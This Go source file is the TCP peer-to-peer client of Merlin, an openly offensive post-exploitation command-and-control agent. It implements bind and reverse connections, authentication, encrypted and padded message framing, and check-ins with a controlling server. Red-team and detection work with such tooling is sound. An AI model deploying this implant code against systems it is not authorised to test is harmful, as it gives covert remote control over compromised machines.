//go:build tcp || !(http || http1 || http2 || http3 || mythic || winhttp || smb || udp)

/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

// Package tcp contains a configurable client used for TCP-based peer-to-peer Agent communications
package tcp

import (
	// Standard
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"encoding/gob"
	"fmt"
	"io"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	// 3rd Party
	"github.com/google/uuid"

	// Merlin
	"github.com/Ne0nd0g/merlin-message"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/authenticators"
	"github.com/Ne0nd0g/merlin-agent/v2/authenticators/none"
	"github.com/Ne0nd0g/merlin-agent/v2/authenticators/opaque"
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/core"
	transformer "github.com/Ne0nd0g/merlin-agent/v2/transformers"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/base64"
	gob2 "github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/gob"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encoders/hex"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/aes"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/jwe"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/rc4"
	"github.com/Ne0nd0g/merlin-agent/v2/transformers/encrypters/xor"
)

const (
	BIND    = 0
	REVERSE = 1
)

// Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
type Client struct {
	address       string                       // address is the network interface and port the agent will bind to
	agentID       uuid.UUID                    // agentID the Agent's UUID
	authenticated bool                         // authenticated tracks if the Agent has successfully authenticated
	authComplete  chan bool                    // authComplete is a channel that is used to block sending messages until the Agent has successfully completed authenticated
	authenticator authenticators.Authenticator // authenticator the method the Agent will use to authenticate to the server
	connected     chan bool                    // connected is a channel that is used to track if the Agent is connected to a Parent
	connection    net.Conn                     // connection the network socket connection used to handle traffic
	listener      net.Listener                 // listener the network socket connection listening for traffic
	listenerID    uuid.UUID                    // listenerID the UUID of the listener that this Agent is configured to communicate with
	paddingMax    int                          // paddingMax the maximum amount of random padding to apply to every Base message
	psk           string                       // psk the pre-shared key used for encrypting messages until authentication is complete
	secret        []byte                       // secret the key used to encrypt messages
	sending       bool                         // sending is a flag that is used to track if the Agent is currently sending a message
	transformers  []transformer.Transformer    // Transformers an ordered list of transforms (encoding/encryption) to apply when constructing a message
	mode          int                          // mode the type of client or communication mode (e.g., BIND or REVERSE)
	sync.Mutex                                 // used to lock the Client when changes are being made by one function or routine
}

// Config is a structure that is used to pass in all necessary information to instantiate a new Client
type Config struct {
	Address      []string  // Address the interface and port the agent will bind to
	AgentID      uuid.UUID // AgentID the Agent's UUID
	AuthPackage  string    // AuthPackage the type of authentication the agent should use when communicating with the server
	ListenerID   uuid.UUID // ListenerID the UUID of the listener that this Agent is configured to communicate with
	Padding      string    // Padding the max amount of data that will be randomly selected and appended to every message
	PSK          string    // PSK the Pre-Shared Key secret the agent will use to start authentication
	Transformers string    // Transformers is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
	Mode         string    // Mode the type of client or communication mode (e.g., BIND or REVERSE)
}

// New instantiates and returns a Client that is constructed from the passed in Config
func New(config Config) (*Client, error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.New() entering into function with config: %+v", config))

	client := Client{}
	client.authComplete = make(chan bool, 1)
	client.connected = make(chan bool, 1)
	if config.AgentID == uuid.Nil {
		return nil, fmt.Errorf("clients/p2p/tcp.New(): a nil Agent UUID was provided")
	}
	client.agentID = config.AgentID
	if config.ListenerID == uuid.Nil {
		return nil, fmt.Errorf("clients/p2p/tcp.New(): a nil Listener UUID was provided")
	}

	switch strings.ToLower(config.Mode) {
	case "tcp-bind":
		client.mode = BIND
	case "tcp-reverse":
		client.mode = REVERSE
	default:
		client.mode = BIND
	}

	client.listenerID = config.ListenerID
	client.psk = config.PSK

	// Parse Address and validate it
	if len(config.Address) <= 0 {
		return nil, fmt.Errorf("a configuration address value was not provided")
	}
	_, err := net.ResolveTCPAddr("tcp", config.Address[0])
	if err != nil {
		return nil, err
	}
	client.address = config.Address[0]

	// Set secret for encryption
	k := sha256.Sum256([]byte(client.psk))
	client.secret = k[:]
	cli.Message(cli.DEBUG, fmt.Sprintf("new client PSK: %s", client.psk))
	cli.Message(cli.DEBUG, fmt.Sprintf("new client Secret: %x", client.secret))

	//Convert Padding from string to an integer
	if config.Padding != "" {
		client.paddingMax, err = strconv.Atoi(config.Padding)
		if err != nil {
			return &client, fmt.Errorf("there was an error converting the padding max to an integer:\r\n%s", err)
		}
	} else {
		client.paddingMax = 0
	}

	// Authenticator
	switch strings.ToLower(config.AuthPackage) {
	case "opaque":
		client.authenticator = opaque.New(config.AgentID)
	case "none":
		client.authenticator = none.New(config.AgentID)
	default:
		return nil, fmt.Errorf("an authenticator must be provided (e.g., 'opaque'")
	}

	// Transformers
	transforms := strings.Split(config.Transformers, ",")
	for _, transform := range transforms {
		var t transformer.Transformer
		switch strings.ToLower(transform) {
		case "aes":
			t = aes.NewEncrypter()
		case "base64-byte":
			t = base64.NewEncoder(base64.BYTE)
		case "base64-string":
			t = base64.NewEncoder(base64.STRING)
		case "gob-base":
			t = gob2.NewEncoder(gob2.BASE)
		case "gob-string":
			t = gob2.NewEncoder(gob2.STRING)
		case "hex-byte":
			t = hex.NewEncoder(hex.BYTE)
		case "hex-string":
			t = hex.NewEncoder(hex.STRING)
		case "jwe":
			t = jwe.NewEncrypter()
		case "rc4":
			t = rc4.NewEncrypter()
		case "xor":
			t = xor.NewEncrypter()
		default:
			err := fmt.Errorf("clients/tcp.New(): unhandled transform type: %s", transform)
			if err != nil {
				return nil, err
			}
		}
		client.transformers = append(client.transformers, t)
	}

	cli.Message(cli.INFO, "Client information:")
	cli.Message(cli.INFO, fmt.Sprintf("\tProtocol: %s", &client))
	cli.Message(cli.INFO, fmt.Sprintf("\tAddress: %s", client.address))
	cli.Message(cli.INFO, fmt.Sprintf("\tListener: %s", client.listenerID))
	cli.Message(cli.INFO, fmt.Sprintf("\tAuthenticator: %s", client.authenticator))
	cli.Message(cli.INFO, fmt.Sprintf("\tTransforms: %+v", client.transformers))
	cli.Message(cli.INFO, fmt.Sprintf("\tPadding: %d", client.paddingMax))

	return &client, nil
}

// Initial executes the specific steps required to establish a connection with the C2 server and checkin or register an agent
func (client *Client) Initial() (err error) {
	cli.Message(cli.DEBUG, "clients/tcp.Initial(): entering into function")
	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Initial(): leaving function with error: %+v", err))

	err = client.Connect()
	if err != nil {
		err = fmt.Errorf("clients/tcp.Initial(): %s", err)
		return
	}
	<-client.connected

	// Authenticate
	err = client.Authenticate(messages.Base{})
	return
}

// Authenticate is the top-level function used to authenticate an agent to server using a specific authentication protocol
// The function must take in a Base message for when the C2 server requests re-authentication through a message
func (client *Client) Authenticate(msg messages.Base) (err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Authenticate(): entering into function with message: %+v", msg))
	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Authenticate(): leaving function with error: %+v", err))
	client.Lock()
	client.authenticated = false
	client.Unlock()
	if len(client.authComplete) > 0 {
		<-client.authComplete
	}
	var authenticated bool
	// Reset the Agent's PSK
	k := sha256.Sum256([]byte(client.psk))
	client.Lock()
	client.secret = k[:]
	client.Unlock()

	// Repeat until authenticator is complete and Agent is authenticated
	for {
		msg, authenticated, err = client.authenticator.Authenticate(msg)
		if err != nil {
			return
		}
		// An empty message was received indicating to exit the function
		if msg.Type == 0 {
			return
		}

		// Once authenticated, update the client's secret used to encrypt messages
		if authenticated {
			client.Lock()
			client.authenticated = true
			client.Unlock()
			var key []byte
			key, err = client.authenticator.Secret()
			if err != nil {
				return
			}
			// Don't update the secret if the authenticator returned an empty key
			if len(key) > 0 {
				client.Lock()
				client.secret = key
				client.Unlock()
			}
		}

		if msg.Type == messages.OPAQUE {
			// Send the message to the server
			var msgs []messages.Base
			msgs, err = client.SendAndWait(msg)
			if err != nil {
				return
			}

			// Add response message to the next loop iteration
			if len(msgs) > 0 {
				// Don't add IDLE messages, just continue on
				if msgs[0].Type != messages.IDLE {
					msg = msgs[0]
				}
			}
		} else {
			_, err = client.Send(msg)
			if err != nil {
				return
			}
		}

		// If the Agent is authenticated, exit the loop and return the function
		if authenticated {
			client.authComplete <- true
			return
		}
	}
}

// Connect establish a connection with the remote host depending on the Client's type (e.g., BIND or REVERSE)
func (client *Client) Connect() (err error) {
	cli.Message(cli.DEBUG, "clients/tcp.Connect(): entering into function")
	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Connect(): leaving function with error %+v", err))

	// Ensure the connected channel is empty. If the Agent's sleep is less than 0, the channel might be full from a prior reconnect
	if len(client.connected) > 0 {
		<-client.connected
	}

	client.Lock()
	defer client.Unlock()

	// Check to see if the connection was restored by a different call stack
	if client.connection != nil {
		return nil
	}
	switch client.mode {
	case BIND:
		if client.listener == nil {
			client.listener, err = net.Listen("tcp", client.address)
			if err != nil {
				return fmt.Errorf("clients/tcp.Connect(): there was an error listening on %s: %s", client.address, err)
			}
			cli.Message(cli.NOTE, fmt.Sprintf("Started %s on %s", client, client.address))
		}

		// Listen for initial connection from upstream agent
		cli.Message(cli.NOTE, fmt.Sprintf("Listening for incoming connection on %s at %s...", client.address, time.Now().UTC().Format(time.RFC3339)))
		client.connection, err = client.listener.Accept()
		if err != nil {
			return fmt.Errorf("clients/tcp.Connect(): there was an error accepting the connection: %s", err)
		}
		cli.Message(cli.NOTE, fmt.Sprintf("Received new connection from %s", client.connection.RemoteAddr()))
		// When an Agent previously authenticated, has a sleep less than 0, and has been unlinked, it will send an IDLE message to the server when a new link is established
		if client.authenticated {
			cli.Message(cli.NOTE, fmt.Sprintf("Sending gratuitious StatusCheckIn at %s...", time.Now().UTC().Format(time.RFC3339)))
			_, err = client.Send(messages.Base{ID: client.agentID, Type: messages.CHECKIN})
		}
		client.connected <- true
		return err
	case REVERSE:
		client.connection, err = net.Dial("tcp", client.address)
		if err != nil {
			return fmt.Errorf("clients/tcp.Connect(): there was an error connecting to %s: %s", client.address, err)
		}
		cli.Message(cli.SUCCESS, fmt.Sprintf("Successfully connected to %s at %s", client.address, time.Now().UTC().Format(time.RFC3339)))
		client.connected <- true
		return nil
	default:
		return fmt.Errorf("clients/tcp.Connect(): Unhandled Client mode %d", client.mode)
	}
}

// Construct takes in a messages.Base structure that is ready to be sent to the server and runs all the configured transforms
// on it to encode and encrypt it.
func (client *Client) Construct(msg messages.Base) (data []byte, err error) {
	for i := len(client.transformers); i > 0; i-- {
		if i == len(client.transformers) {
			// First call should always take a Base message
			data, err = client.transformers[i-1].Construct(msg, client.secret)
		} else {
			data, err = client.transformers[i-1].Construct(data, client.secret)
		}
		if err != nil {
			return nil, fmt.Errorf("clients/tcp.Construct(): there was an error calling the transformer construct function: %s", err)
		}
	}
	return
}

// Deconstruct takes in data returned from the server and runs all the Agent's transforms on it until
// a messages.Base structure is returned. The key is used for decryption transforms
func (client *Client) Deconstruct(data []byte) (messages.Base, error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Deconstruct(): entering into function with message: %+v", data))
	//fmt.Printf("Deconstructing %d bytes with key: %x\n", len(data), client.secret)
	for _, transform := range client.transformers {
		//fmt.Printf("Transformer %T: %+v\n", transform, transform)
		ret, err := transform.Deconstruct(data, client.secret)
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("clients/tcp.Deconstruct(): unable to deconstruct with Agent's secret, retrying with PSK"))
			// Try to see if the PSK works
			k := sha256.Sum256([]byte(client.psk))
			ret, err = transform.Deconstruct(data, k[:])
			if err != nil {
				return messages.Base{}, err
			}
			// If the PSK worked, assume the agent is unauthenticated to the server
			client.authenticated = false
			client.secret = k[:]
		}
		switch ret.(type) {
		case []uint8:
			data = ret.([]byte)
		case string:
			data = []byte(ret.(string)) // Probably not what I should be doing
		case messages.Base:
			//fmt.Printf("pkg/listeners.Deconstruct(): returning Base message: %+v\n", ret.(messages.Base))
			return ret.(messages.Base), nil
		default:
			return messages.Base{}, fmt.Errorf("clients/tcp.Deconstruct(): unhandled data type for Deconstruct(): %T", ret)
		}
	}
	return messages.Base{}, fmt.Errorf("clients/tcp.Deconstruct(): unable to transform data into messages.Base structure")
}

// Listen waits for incoming data on an established TCP connection, deconstructs the data into a Base messages, and returns them
func (client *Client) Listen() (returnMessages []messages.Base, err error) {
	cli.Message(cli.DEBUG, "clients/tcp.Listen(): entering into function")
	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Listen(): leaving function with error %+v and return messages: %+v", err, returnMessages))

	// Repair broken connections
	if client.connection == nil {
		switch client.mode {
		case BIND:
			// If the connection is empty and this is a BIND agent, wait for connection from Parent Agent
			cli.Message(cli.NOTE, fmt.Sprintf("Client connection was empty. Re-establishing connection at %s...", time.Now().UTC().Format(time.RFC3339)))
			err = client.Connect()
			if err != nil {
				err = fmt.Errorf("clients/tcp.Listen(): %s", err)
				return
			}
		case REVERSE:
			if !client.sending {
				// If the Agent's sleep is 0, which isn't known in this package, then there will never be a message to send and this will cause a deadlock
				// Return a message so that there is a message to send, forcing the communication
				client.Lock()
				client.sending = true
				client.Unlock()
				cli.Message(cli.NOTE, fmt.Sprintf("Client connection was empty and sending signal is false, returning gratuitious StatusCheckIn messages at %s", time.Now().UTC().Format(time.RFC3339)))
				return []messages.Base{{ID: client.agentID, Type: messages.CHECKIN}}, nil
			} else {
				// If the connection is empty and this is a REVERSE agent, wait here until the connection is established
				cli.Message(cli.INFO, fmt.Sprintf("Waiting for a client connection before listening for messages at %s", time.Now().UTC().Format(time.RFC3339)))
				<-client.connected
				cli.Message(cli.SUCCESS, fmt.Sprintf("Client connection re-esablished at %s", time.Now().UTC().Format(time.RFC3339)))
			}
		}
	}

	// Wait for the response
	cli.Message(cli.NOTE, fmt.Sprintf("Listening for incoming messages from %s on %s at %s...", client.connection.RemoteAddr(), client.connection.LocalAddr(), time.Now().UTC().Format(time.RFC3339)))

	var n int
	var tag uint32
	var length uint64
	var buff bytes.Buffer
	for {
		respData := make([]byte, 4096)

		n, err = client.connection.Read(respData)
		cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Listen(): Read %d bytes from connection %s at %s", n, client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
		if err != nil {
			if err == io.EOF {
				cli.Message(cli.WARN, fmt.Sprintf("clients/tcp.Listen(): received EOF from %s, the Agent's connection has been reset", client.connection.RemoteAddr()))
				err = nil
				client.connection = nil
				return
			}
			err = fmt.Errorf("clients/tcp.Listen(): there was an error reading the message from the connection with %s: %s", client.connection.RemoteAddr(), err)
			client.connection = nil
			return
		}

		// Add the bytes to the buffer
		n, err = buff.Write(respData[:n])
		if err != nil {
			err = fmt.Errorf("clients/tcp.Listen(): there was an error writing %d incoming bytes to the local buffer: %s", n, err)
			client.connection = nil
			return
		}

		// If this is the first read on the connection determine the tag and data length
		if tag == 0 {
			// Ensure we have enough data to read the tag/type which is 4-bytes
			if buff.Len() < 4 {
				cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Listen(): Need at least 4 bytes in the buffer to read the Type/Tag for TLV but only have %d", buff.Len()))
				continue
			}
			tag = binary.BigEndian.Uint32(respData[:4])
			if tag != 1 {
				err = fmt.Errorf("clients/tcp.Listen(): Expected a type/tag value of 1 for TLV but got %d", tag)
				client.connection = nil
				return
			}
		}

		if length == 0 {
			// Ensure we have enough data to read the Length from TLV which is 8-bytes plus the 4-byte tag/type size
			if buff.Len() < 12 {
				cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Listen(): Need at least 12 bytes in the buffer to read the Length for TLV but only have %d", buff.Len()))
				continue
			}
			length = binary.BigEndian.Uint64(respData[4:12])
		}

		// If we've read all the data according to the length provided in TLV, then break the for loop
		// Type/Tag size is 4-bytes, Length size is 8-bytes for TLV
		if uint64(buff.Len()) == length+4+8 {
			cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Listen(): Finished reading data length of %d bytes into the buffer and moving forward to deconstruct the data", length))
			break
		} else {
			cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Listen(): Read %d of %d bytes into the buffer", buff.Len(), length))
		}
	}

	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from TCP connection %s at %s", buff.Len(), client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
	var msg messages.Base
	// Type/Tag size is 4-bytes, Length size is 8-bytes for a total of 12-bytes for TLV
	msg, err = client.Deconstruct(buff.Bytes()[12:])
	if err != nil {
		err = fmt.Errorf("clients/tcp.Listen(): there was an error deconstructing the data: %s", err)
		return
	}

	returnMessages = append(returnMessages, msg)
	return
}

// Send takes in a Merlin message structure, performs any encoding or encryption, converts it to a delegate and writes it to the output stream.
// This function DOES not wait or listen for response messages.
func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Send(): entering into function with Base message: %+v", m))
	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Send(): leaving function with error: %v and returnMessages: %+v", err, returnMessages))

	// Recover connection
	if client.connection == nil {
		switch client.mode {
		case BIND:
			// If the connection is empty and this is a BIND agent, wait here for listener to receive a connection
			cli.Message(cli.NOTE, fmt.Sprintf("Waiting for a client connection before sending message at %s", time.Now().UTC().Format(time.RFC3339)))
			<-client.connected
		case REVERSE:
			// Signal to the listen() function that we are attempting to recover the connection
			client.Lock()
			client.sending = true
			client.Unlock()
			// If the connection is empty and this is a REVERSE agent, attempt to connect to the listener
			cli.Message(cli.NOTE, fmt.Sprintf("Client connection was empty. Re-establishing connection at %s...", time.Now().UTC().Format(time.RFC3339)))
			err = client.Connect()
			if err != nil {
				err = fmt.Errorf("clients/tcp.Send(): %s", err)
				return
			}
			// Once the connection has successfully been recovered, and a message has been sent, reset the sending signal for the listen() function
			defer func() {
				client.Lock()
				client.sending = false
				client.Unlock()
			}()
		}
	}

	if !client.authenticated && m.Type != messages.OPAQUE {
		cli.Message(cli.INFO, fmt.Sprintf("Waiting for authentication to complete before sending message at %s", time.Now().UTC().Format(time.RFC3339)))
		<-client.authComplete
		cli.Message(cli.INFO, fmt.Sprintf("Authentication completed, continuing with sending held message at %s", time.Now().UTC().Format(time.RFC3339)))
	}

	// Set the message padding
	if client.paddingMax > 0 {
		// #nosec G404 -- Random number does not impact security
		m.Padding = core.RandStringBytesMaskImprSrc(rand.Intn(client.paddingMax))
	}

	data, err := client.Construct(m)
	if err != nil {
		err = fmt.Errorf("clients/tcp.Send(): there was an error constructing the data: %s", err)
		return
	}

	delegate := messages.Delegate{
		Listener: client.listenerID,
		Agent:    client.agentID,
		Payload:  data,
	}

	// Convert messages.Base to gob
	// Still need this for agent to agent message encoding
	delegateBytes := new(bytes.Buffer)
	err = gob.NewEncoder(delegateBytes).Encode(delegate)
	if err != nil {
		err = fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", m.Type, err)
		return
	}

	cli.Message(cli.NOTE, fmt.Sprintf("Sending %s message to %s at %s", m.Type, client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))

	// Add in Tag/Type and Length for TLV
	tag := make([]byte, 4)
	binary.BigEndian.PutUint32(tag, 1)
	length := make([]byte, 8)
	binary.BigEndian.PutUint64(length, uint64(delegateBytes.Len()))

	// Create TLV
	outData := append(tag, length...)
	outData = append(outData, delegateBytes.Bytes()...)
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Send(): Added Tag: %d and Length: %d to data size of %d\n", tag, uint64(delegateBytes.Len()), len(outData)))

	// Write the message
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Send(): Writing message size: %d to: %s", len(outData), client.connection.RemoteAddr()))
	n, err := client.connection.Write(outData)
	if err != nil {
		err = fmt.Errorf("there was an error writing the message to the connection with %s: %s", client.connection.RemoteAddr(), err)
		return
	}

	cli.Message(cli.NOTE, fmt.Sprintf("Wrote %d bytes to connection %s", n, client.connection.RemoteAddr()))

	return
}

// SendAndWait takes in a Merlin message, encodes/encrypts it, and writes it to the output stream and then waits for response
// messages and returns them
func (client *Client) SendAndWait(m messages.Base) (returnMessages []messages.Base, err error) {
	cli.Message(cli.DEBUG, "Entering into clients/tcp.SendAndWait()...")

	// Send
	returnMessages, err = client.Send(m)
	if err != nil {
		err = fmt.Errorf("clients/tcp.SendAndWait(): %s", err)
		return
	}

	// Listen
	return client.Listen()
}

// Get is a generic function that is used to retrieve the value of a Client's field
func (client *Client) Get(key string) (value string) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Get(): entering into function with key: %s", key))
	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Get(): leaving function with value: %s", value))
	switch strings.ToLower(key) {
	case "ja3":
		return ""
	case "paddingmax":
		value = strconv.Itoa(client.paddingMax)
	case "protocol":
		value = client.String()
	default:
		value = fmt.Sprintf("unknown client configuration setting: %s", key)
	}
	return
}

// Set is a generic function that is used to modify a Client's field values
func (client *Client) Set(key string, value string) (err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Set(): entering into function with key: %s, value: %s", key, value))
	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/tcp.Set(): exiting function with err: %v", err))
	client.Lock()
	defer client.Unlock()

	switch strings.ToLower(key) {
	case "addr":
		// Validate the address
		_, err = net.ResolveTCPAddr("tcp", value)
		if err != nil {
			err = fmt.Errorf("clients/tcp.Set(): there was an error parsing the provide address %s : %s", value, err)
			return
		}
		// Close the connection
		err = client.connection.Close()
		if err != nil {
			err = fmt.Errorf("clients/tcp.Set(): there was an error closing the connection: %s", err)
			return
		}
		client.connection = nil
		if client.mode == BIND {
			// Close the listener
			err = client.listener.Close()
			if err != nil {
				err = fmt.Errorf("clients/tcp.Set(): there was an error closing the listener: %s", err)
				return
			}
		}
		client.listener = nil
		client.address = value
	case "listener":
		var id uuid.UUID
		id, err = uuid.Parse(value)
		if err != nil {
			return fmt.Errorf("clients/tcp.Set(): %s", err)
		}
		client.listenerID = id
	case "paddingmax":
		client.paddingMax, err = strconv.Atoi(value)
	case "secret":
		client.secret = []byte(value)
	default:
		err = fmt.Errorf("unknown tcp client setting: %s", key)
	}
	return err
}

// String returns the type of TCP client
func (client *Client) String() string {
	switch client.mode {
	case BIND:
		return "tcp-bind"
	case REVERSE:
		return "tcp-reverse"
	default:
		return "tcp-unhandled"
	}
}

// Synchronous identifies if the client connection is synchronous or asynchronous, used to determine how and when messages
// can be sent/received.
func (client *Client) Synchronous() bool {
	switch client.mode {
	case BIND:
		return true
	case REVERSE:
		return true
	default:
		return false
	}
}
